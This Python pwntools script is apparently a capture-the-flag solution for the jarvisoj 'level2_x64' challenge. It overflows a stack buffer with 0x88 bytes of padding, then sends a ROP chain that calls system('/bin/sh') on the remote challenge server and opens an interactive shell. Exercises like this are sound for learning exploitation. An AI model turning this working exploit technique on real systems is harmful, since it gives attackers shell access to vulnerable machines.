#!/usr/bin/env python
# -*- encoding: utf-8 -*-
__author__ = 'Albertchang'
from pwn import *
#context.log_level = "debug"
DEBUG = 0
LOCAL = 0
if LOCAL == 1:
    p = process('./level2_x64.04d700633c6dc26afc6a1e7e9df8c94e')
else:
    p = remote('127.0.0.1',6666)
    p = remote('pwn2.jarvisoj.com',9882)

elf = ELF('./level2_x64.04d700633c6dc26afc6a1e7e9df8c94e')
poprdi_addr = 0x4006b3
system_addr = elf.plt['system']
print hex(system_addr)
binsh_addr = next(elf.search('/bin/sh'))
print hex(binsh_addr)
p.recvuntil('Input:')
payload = 'a' * 0x88 + p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload)
p.interactive()

